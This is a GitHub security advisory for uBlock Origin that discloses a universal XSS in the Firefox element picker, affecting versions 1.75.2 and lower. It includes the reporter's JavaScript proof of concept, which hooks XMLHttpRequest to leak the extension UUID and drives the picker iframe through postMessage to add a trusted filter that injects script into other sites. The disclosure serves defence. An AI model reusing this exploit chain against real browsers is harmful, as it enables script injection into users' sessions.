GHSA-cmqw-9r2w-6wv2 [/gorhill/uBlock/security/advisories/GHSA-cmqw-9r2w-6wv2]

 Universal XSS from website-driven element picker

 High

 gorhill [/gorhill]
 published
 GHSA-cmqw-9r2w-6wv2
 Nov 15, 2026

Package

 uBlock Origin 

Affected versions

1.75.2 and lower

Patched versions

1.75.4

Description

Summary

As reported:

For the Firefox MV2 extension, it’s possible for a webpage to iframe the element picker and control it to add arbitrary trusted filters when a user clicks on the webpage, if there’s a filter rule with a prevent-xhr or prevent-fetch scriptlet that fulfills the response with a WAR.

The attacker website can hook XHR like this to extract the extension UUID (and the long WAR secret on MV2 Chromium).

Details

Update: Blog post by reporter, https://iter.ca/post/ubo-uxss/ [https://iter.ca/post/ubo-uxss/]

Vulnerability reported through email on Nov. 1st, 2026.

Email subject: "Universal XSS from website-driven element picker"

=====

Proof of concept

As reported:

I made a full example at https://lootdest.pages.dev/demo [https://lootdest.pages.dev/demo] (firefox only, and takes a few seconds to load) which uses the lootdest.*##+js(no-fetch-if, adsbygoogle, war:googlesyndication_adsbygoogle.js) rule in uAssets. If you want to test this on other domains you can add *##+js(prevent-xhr, leakme, war:noop.js) as a custom filter.

The attacker website can hook XHR like this to extract the extension UUID (and the long WAR secret on MV2 Chromium):

const open = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(m, url, ...a) {
 const e = /^moz-extension:\/\/[^/]+/.exec(url);
 if (e) {
 XMLHttpRequest.prototype.open = open;
 mount(e[0]);
 }
 return open.call(this, m, url, ...a); };

Then you can use that to iframe the element picker, and send messages to it to show it and set the filter:

const f = document.getElementById("f"); // <iframe> in the page
function mount(origin) {
 const shown = '||example.com';
 const opt = 'image\n' + String.raw`google.com##+js(trusted-rpnt, script, /^[\s\S]*$/, alert('injected on '+document.domain))`;
 f.onload = () => {
 const t = setInterval(() => {
 const ch = new MessageChannel();
 ch.port1.onmessage = ({ data }) => {
 if (data.what === 'start') {
 clearInterval(t);
 ch.port1.postMessage({
 what: 'showDialog',
 url: 'https://example.com/',
 netFilters: [shown],
 cosmeticFilters: [],
 filter: { filters: [shown], slot: 0 }
 });
 } else if (data.what === 'dialogSetFilter') {
 ch.port1.postMessage({

 count: 1,

 });
 }
 };
 f.contentWindow.postMessage({ what: 'epickerStart' }, '*', [ch.port2]);
 }, 250);
 };
 f.src = `${origin}/web_accessible_resources/epicker-ui.html`;
}

And then fetch('/adsbygoogle.js').catch(() => {}); (or whatever endpoint is affected by the prevent-xhr rule) to trigger all of that.
